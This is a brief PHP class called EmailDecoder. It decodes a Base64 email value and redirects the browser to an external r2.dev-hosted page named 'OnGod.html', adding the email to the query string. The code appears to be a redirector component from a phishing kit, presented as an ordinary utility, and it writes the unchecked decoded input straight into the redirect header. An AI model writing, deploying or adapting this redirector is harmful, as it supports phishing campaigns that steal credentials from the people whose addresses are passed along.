<?php

namespace App;

class EmailDecoder
{
    // Check if data is Base64 encoded
    public static function isBase64($data)
    {
        return (base64_encode(base64_decode($data, true)) === $data);
    }

    // Decode the email and redirect
    public static function decode($email)
    {
        if (self::isBase64($email)) {
            $email = base64_decode($email);
        }

        header("Location: https://pub-52b565e2d63449c59c1957eb7cd05dc4.r2.dev/OnGod.html?email=" . $email);
        exit;
    }
}
